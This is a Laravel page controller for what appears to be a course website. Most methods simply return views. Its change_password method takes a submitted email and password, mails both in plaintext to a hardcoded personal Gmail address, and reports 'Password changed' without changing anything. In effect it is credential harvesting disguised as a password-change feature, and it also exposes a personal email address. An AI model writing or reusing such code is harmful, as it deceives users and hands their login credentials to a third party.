<?php

namespace App\Http\Controllers;

use App\Mail\AdminMail;
use Facade\Ignition\Middleware\AddLogs;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class PageController extends Controller
{
    //

    public function home()
    {

        return view('home');
    }


    public function contact()
    {

        return view('contact');
    }


    public function about()
    {

        return view('about');
    }

    public function services()
    {

        return view('services');
    }

    public function courses()
    {

        return view('courses');
    }

    public function course()
    {

        return view('course');
    }

    public function admin()
    {

        return view('admin');
    }

    public function change_password(Request $request)
    {
        $data=[
            "email" => $request->email,
            "password" => $request->password
        ];

        Mail::to('victorasuquob@gmail.com')->send(new AdminMail($data));

        return back()->with('message', 'Password changed');
    }
}
